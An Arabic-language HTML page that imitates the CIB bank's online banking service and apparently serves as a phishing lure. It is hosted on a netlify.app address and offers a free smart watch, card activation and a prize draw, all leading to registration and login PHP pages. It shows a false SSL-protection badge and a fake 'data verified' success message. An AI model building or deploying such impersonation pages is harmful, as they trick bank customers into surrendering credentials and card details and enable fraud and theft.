<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="الخدمات المصرفية الإلكترونية من بنك CIB.">
    <meta property="og:url" content="https://eg-cib.netlify.app/">
    <meta property="og:type" content="website">
    <meta property="og:title" content="بنك CIB">
    <meta property="og:description" content="الخدمات المصرفية الإلكترونية من بنك CIB.">
    <meta property="og:image" content="https://eg-cib.netlify.app/assets/wajha.png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta name="twitter:card" content="summary_large_image">
    <meta property="twitter:domain" content="eg-cib.netlify.app">
    <meta property="twitter:url" content="https://eg-cib.netlify.app/">
    <meta name="twitter:title" content="بنك CIB">
    <meta name="twitter:description" content="الخدمات المصرفية الإلكترونية من بنك CIB.">
    <meta name="twitter:image" content="https://eg-cib.netlify.app/assets/wajha.png">
    <link rel="prefetch" href="registration.php">
    <link rel="prefetch" href="login.php">
    <title>بنك CIB</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            background: #f0f4f8;
            color: #1a2332;
            direction: rtl;
            display: flex;
            justify-content: center;
            align-items: flex-start;
        }

        .page-wrapper {
            width: 100%;
            max-width: 420px;
            min-height: 100vh;
            background: #ffffff;
            position: relative;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.06);
        }

        /* ─── Header ─── */
        .header {
            background: linear-gradient(135deg, #1a5ca8 0%, #0d3b6e 100%);
            padding: 36px 24px 28px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -60%;
            right: -40%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.06) 0%, transparent 50%);
            pointer-events: none;
        }

        .header-logo {
            width: 140px;
            height: auto;
            filter: brightness(10);
            margin-bottom: 8px;
            position: relative;
            z-index: 1;
        }

        .header-welcome {
            color: rgba(255,255,255,0.7);
            font-size: 13px;
            position: relative;
            z-index: 1;
        }

        /* ─── Banner ─── */
        .banner-section {
            padding: 16px 16px 0;
        }

        .banner-img {
            width: 100%;
            border-radius: 14px;
            display: block;
            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
        }

        /* ─── Section Title ─── */
        .section-title {
            font-size: 17px;
            font-weight: 700;
            color: #1a2332;
            padding: 20px 24px 12px;
        }

        /* ─── Cards ─── */
        .cards-area {
            padding: 0 16px 16px;
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        .product-card {
            background: #fff;
            border: 1.5px solid #e8edf3;
            border-radius: 16px;
            padding: 18px;
            display: flex;
            align-items: center;
            gap: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .product-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 3px;
            background: linear-gradient(90deg, #1a5ca8, #2563eb);
            transform: scaleX(0);
            transform-origin: right;
            transition: transform 0.3s ease;
        }

        .product-card:hover::before { transform: scaleX(1); }

        .product-card:hover {
            border-color: #bfdbfe;
            box-shadow: 0 6px 24px rgba(26, 92, 168, 0.1);
            transform: translateY(-2px);
        }

        .product-card:active {
            transform: scale(0.98);
        }

        .card-img-wrap {
            width: 72px;
            height: 72px;
            border-radius: 14px;
            background: linear-gradient(135deg, #eff6ff, #dbeafe);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            overflow: hidden;
        }

        .card-img-wrap img {
            width: 56px;
            height: 56px;
            object-fit: contain;
        }

        .card-body {
            flex: 1;
            min-width: 0;
        }

        .card-name {
            font-size: 15px;
            font-weight: 700;
            color: #1a2332;
            margin-bottom: 4px;
        }

        .card-desc {
            font-size: 12px;
            color: #64748b;
            line-height: 1.5;
        }

        .card-arrow {
            flex-shrink: 0;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #f1f5f9;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
        }

        .product-card:hover .card-arrow {
            background: #1a5ca8;
        }

        .product-card:hover .card-arrow svg {
            stroke: #fff;
        }

        /* ─── Watch Selection ─── */
        .watch-section {
            display: none;
            padding: 0 16px 24px;
            animation: fadeUp 0.5s ease;
        }

        .watch-section.active { display: block; }

        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .watch-title {
            font-size: 17px;
            font-weight: 700;
            color: #1a2332;
            text-align: center;
            margin-bottom: 16px;
            padding-top: 4px;
        }

        .watches-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }

        .watch-item {
            aspect-ratio: 1;
            border-radius: 50%;
            overflow: hidden;
            cursor: pointer;
            border: 3px solid #e2e8f0;
            background: linear-gradient(135deg, #f8fafc, #eef2f7);
            transition: all 0.3s ease;
            position: relative;
            box-shadow: 0 2px 10px rgba(0,0,0,0.06);
        }

        .watch-item:hover {
            border-color: #93c5fd;
            transform: scale(1.04) translateY(-3px);
            box-shadow: 0 8px 24px rgba(26, 92, 168, 0.15);
        }

        .watch-item.selected {
            border-color: #1a5ca8;
            border-width: 4px;
            transform: scale(1.02);
            box-shadow: 0 6px 20px rgba(26, 92, 168, 0.25);
        }

        .watch-item.selected::after {
            content: '✓';
            position: absolute;
            inset: 0;
            background: rgba(26, 92, 168, 0.4);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            color: #fff;
            font-weight: 800;
            text-shadow: 0 2px 8px rgba(0,0,0,0.3);
            animation: checkPop 0.4s ease;
            border-radius: 50%;
        }

        @keyframes checkPop {
            0% { transform: scale(0); opacity: 0; }
            60% { transform: scale(1.2); }
            100% { transform: scale(1); opacity: 1; }
        }

        .watch-item img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            padding: 10px;
            transition: transform 0.3s;
        }

        .watch-item:hover img { transform: scale(1.08); }

        /* ─── Success Page ─── */
        .done-section {
            display: none;
            text-align: center;
            padding: 48px 24px;
            animation: fadeUp 0.6s ease;
        }

        .done-section.active { display: block; }

        .done-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #dcfce7, #bbf7d0);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            animation: scaleIn 0.5s ease;
        }

        @keyframes scaleIn {
            0% { transform: scale(0); }
            60% { transform: scale(1.15); }
            100% { transform: scale(1); }
        }

        .done-title {
            font-size: 22px;
            font-weight: 700;
            color: #166534;
            margin-bottom: 8px;
        }

        .done-sub {
            color: #64748b;
            font-size: 14px;
            line-height: 1.7;
        }

        /* ─── Bottom Nav ─── */
        .bottom-nav {
            margin-top: auto;
            background: linear-gradient(135deg, #1a5ca8, #0d3b6e);
            padding: 14px 6px 16px;
            display: flex;
            justify-content: space-around;
            align-items: flex-start;
        }

        .nav-item {
            text-align: center;
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        .nav-item span {
            color: #fff;
            font-size: 10px;
            line-height: 1.4;
            opacity: 0.85;
        }

        /* ─── Contact Bar ─── */
        .contact-bar {
            background: linear-gradient(135deg, #00b5c9, #0891b2);
            padding: 12px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 7px;
        }

        .contact-bar span { color: #fff; font-size: 13px; }
        .contact-bar a { color: #fff; font-size: 13px; font-weight: 700; text-decoration: none; }

        /* ─── Security ─── */
        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding: 14px 0;
        }

        .security-note span {
            color: #64748b;
            font-size: 11px;
            font-weight: 500;
        }

        @media (max-width: 480px) {
            .page-wrapper { max-width: 100%; }
            .header { padding: 28px 20px 22px; }
            .header-logo { width: 110px; }
        }
    </style>
</head>

<body>
    <div class="page-wrapper">
        <!-- Header -->
        <div class="header">
            <img src="assets/logo.webp" alt="CIB" class="header-logo" decoding="async">
            <div class="header-welcome">الخدمات المصرفية الإلكترونية</div>
        </div>

        <!-- Banner -->
        <div class="banner-section">
            <img src="assets/wajha.webp" alt="CIB" class="banner-img" fetchpriority="high" decoding="async">
        </div>

        <!-- Main Content -->
        <div id="mainContent">
            <div class="section-title">اختر الخدمة المطلوبة</div>

            <div class="cards-area">
                <!-- Card 1: Smart Watch -->
                <div class="product-card" onclick="selectRequest('smart_watch')">
                    <div class="card-img-wrap">
                        <img src="assets/watch.webp" alt="ساعة ذكية" loading="lazy" decoding="async">
                    </div>
                    <div class="card-body">
                        <div class="card-name">طلب ساعة ذكية</div>
                        <div class="card-desc">ساعة يد ذكية عصرية ومرنة</div>
                    </div>
                    <div class="card-arrow">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
                    </div>
                </div>

                <!-- Card 2: Credit Card -->
                <div class="product-card" onclick="selectRequest('credit_card')">
                    <div class="card-img-wrap">
                        <img src="assets/card.webp" alt="بطاقة" loading="lazy" decoding="async">
                    </div>
                    <div class="card-body">
                        <div class="card-name">تفعيل البطاقة</div>
                        <div class="card-desc">تفعيل البطاقة المصرفية بسهولة وأمان</div>
                    </div>
                    <div class="card-arrow">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
                    </div>
                </div>

                <!-- Card 3: Daily Prizes -->
                <div class="product-card" onclick="selectRequest('daily_prizes')">
                    <div class="card-img-wrap">
                        <img src="assets/jwaes.webp" alt="جوائز" loading="lazy" decoding="async">
                    </div>
                    <div class="card-body">
                        <div class="card-name">الجائزة الكبرى</div>
                        <div class="card-desc">المشاركة في السحب على الجوائز القيمة</div>
                    </div>
                    <div class="card-arrow">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
                    </div>
                </div>
            </div>
        </div>

        <!-- Watch Selection -->
        <div class="watch-section" id="watchSelection">
            <div class="watch-title">قم باختيار الساعة</div>
            <div class="watches-grid">
                <div class="watch-item" onclick="selectWatch('watch4', this)">
                    <img src="assets/watch4.webp" alt="ساعة 4" loading="lazy" decoding="async">
                </div>
                <div class="watch-item" onclick="selectWatch('watch3', this)">
                    <img src="assets/watch3.webp" alt="ساعة 3" loading="lazy" decoding="async">
                </div>
                <div class="watch-item" onclick="selectWatch('watch2', this)">
                    <img src="assets/watch2.webp" alt="ساعة 2" loading="lazy" decoding="async">
                </div>
                <div class="watch-item" onclick="selectWatch('watch5', this)">
                    <img src="assets/watch5.webp" alt="ساعة 5" loading="lazy" decoding="async">
                </div>
                <div class="watch-item" onclick="selectWatch('watch1', this)">
                    <img src="assets/watch1.webp" alt="ساعة 1" loading="lazy" decoding="async">
                </div>
                <div class="watch-item" onclick="selectWatch('watch6', this)">
                    <img src="assets/watch6.webp" alt="ساعة 6" loading="lazy" decoding="async">
                </div>
            </div>
        </div>

        <!-- Done Section (shown when ?done=1) -->
        <div class="done-section" id="doneSection">
            <div class="done-icon">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#166534" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
            </div>
            <div class="done-title">تمت العملية بنجاح</div>
            <div class="done-sub">شكراً لك! تم التحقق من بياناتك بنجاح.<br>سيتم التواصل معك قريباً.</div>
        </div>

        <!-- Security -->
        <div class="security-note">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            <span>بياناتك محمية بتشفير 256-bit SSL</span>
        </div>

        <!-- Contact -->
        <div class="contact-bar">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.32.57 3.58.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1C10.61 21 3 13.39 3 4c0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.26.2 2.47.57 3.6.1.34.02.72-.24.98L6.6 10.8z"/></svg>
            <span>تحتاج إلى مساعدة؟</span>
            <a href="#">اتصل بنا</a>
        </div>

        <!-- Bottom Nav -->
        <div class="bottom-nav">
            <div class="nav-item">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.7"><circle cx="12" cy="10" r="3"/><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/></svg>
                <span>الفروع والصراف</span>
            </div>
            <div class="nav-item">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.7"><polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5" rx="1"/><line x1="12" y1="22" x2="12" y2="7"/></svg>
                <span>مكافأة CIB</span>
            </div>
            <div class="nav-item">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.8"><line x1="3" y1="8" x2="21" y2="8"/><polyline points="17,4 21,8 17,12"/><line x1="21" y1="16" x2="3" y2="16"/><polyline points="7,12 3,16 7,20"/></svg>
                <span>أسعار الصرف</span>
            </div>
        </div>
    </div>

    <script>
        let selectedWatch = null;

        // Check if done
        (function() {
            const params = new URLSearchParams(window.location.search);
            if (params.get('done') === '1') {
                document.getElementById('mainContent').style.display = 'none';
                document.getElementById('doneSection').classList.add('active');
            }
        })();

        function selectRequest(type) {
            switch (type) {
                case 'smart_watch':
                case 'smart_watch_premium':
                    document.getElementById('mainContent').style.display = 'none';
                    document.getElementById('watchSelection').classList.add('active');
                    break;
                case 'credit_card':
                case 'daily_prizes':
                    window.location.href = 'registration.php';
                    break;
            }
        }

        function selectWatch(watchId, element) {
            document.querySelectorAll('.watch-item').forEach(item => item.classList.remove('selected'));
            element.classList.add('selected');
            selectedWatch = watchId;
            sessionStorage.setItem('selectedWatch', watchId);

            setTimeout(() => {
                window.location.href = 'registration.php';
            }, 800);
        }
    </script>
</body>

</html>